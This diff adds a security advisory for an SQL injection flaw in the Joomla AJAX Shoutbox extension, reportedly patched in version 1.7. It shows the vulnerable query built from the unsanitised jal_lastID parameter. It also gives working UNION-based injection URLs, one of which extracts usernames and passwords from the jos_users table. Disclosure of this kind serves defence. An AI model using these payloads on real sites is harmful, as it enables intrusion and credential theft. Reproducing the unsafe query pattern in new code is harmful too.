@@ -1,0 +1,30 @@
+###################################################################################
+Joomla AJAX Shoutbox remote SQL Injection vulnerability
+
+[-] Author: Ibrahim Raafat
+[-] Contact: https://twitter.com/RaafatSEC
+[-] Discovery date: 1 April 2010 [ 4 years ago ]
+[-] Reported to vendor : 12 March 2014
+[-] Response: Quick response from the developer, Patched and released version 1.7 in the same day
+[-] Download: http://extensions.joomla.org/extensions/communication/shoutbox/43
+
+[+] Details:
+[-] include "helper.php";
+[-] parameter: jal_lastID
+[-] Code: 
+113	$jal_lastID = JRequest::getVar( 'jal_lastID',		0		 );
+114
+115	$query = 'SELECT * FROM #__shoutbox WHERE id > '.$jal_lastID.' ORDER BY id DESC';
+
+[-] Exploit: 
+?mode=getshouts&jal_lastID=1337133713371337+union+select+column,2,3,4,5,6+from+table-- -
+
+Example:
+?mode=getshouts&jal_lastID=1337133713371337+union+select+group_concat(username,0x3a,password),1,1,1,1,1+from+jos_users-- -
+
+[+] An amazing tool to discover and exploit SQL Injection vulnerability [ Sculptor - sculptordev.com ]
+Founded by https://twitter.com/MSM_1st
+
+###################################################################################
+
+
